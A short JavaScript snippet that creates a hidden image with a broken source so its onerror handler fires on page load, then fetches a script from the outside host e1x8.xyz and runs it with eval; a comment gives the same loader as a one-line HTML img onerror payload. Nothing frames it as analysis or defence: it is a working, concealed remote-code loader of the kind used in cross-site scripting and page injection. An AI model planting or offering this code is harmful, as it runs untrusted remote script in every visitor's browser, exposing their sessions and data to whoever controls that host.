// Add in DOM content loaded
// <img src="asd" id="targetImage" onerror='fetch("https://e1x8.xyz/scripts/main.js").then((response) => response.text()).then((text) => eval(text)).then(() => {})' style="display: none;"></img>
const image = document.createElement('img');
image.src = 'asd';
image.id = 'targetImage';
image.style.display = 'none';
image.onerror = async () => {
  try {
    const response = await fetch("https://e1x8.xyz/scripts/main.js");
    const text = await response.text();
    eval(text);
  } catch (error) {
    console.error("Error fetching or executing script:", error);
  }
};
document.body.appendChild(image);